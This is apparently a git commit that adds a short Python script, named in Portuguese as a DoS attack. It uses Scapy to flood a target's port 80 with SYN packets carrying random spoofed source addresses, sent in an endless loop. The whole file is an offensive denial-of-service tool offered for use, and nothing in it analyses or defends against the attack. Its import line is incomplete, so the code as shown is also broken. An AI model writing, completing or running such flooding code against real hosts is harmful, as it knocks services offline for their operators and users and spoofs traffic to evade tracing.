616afa8c5f4bfe33747ba2791b70f76f76b744b2
Leonardo Estigarribiba <93357213+Dogmobile@users.noreply.github.com>
2022-03-17 08:14:17 -0300

    Create ataque Dos

---
+++ ataque DoS.py
@@ -0,0 +1,24 @@
+#pip install scapy
+#baixar a bibloteca Scapy.all
+
+from scapy import   
+
+
+#IP ATIVO
+
+target_ip = ''
+
+#porta a ser direcionada
+target_port = 80
+
+ip = IP (src=RandIP(), dst= target_ip)
+
+tcp = TCP (sport=RandShort(),
+            dport=target_port,
+            flags='s')
+
+raw = Raw(b'x'*1024)
+
+pkt = ip/tcp/raw
+send(pkt,loop = 1)
+
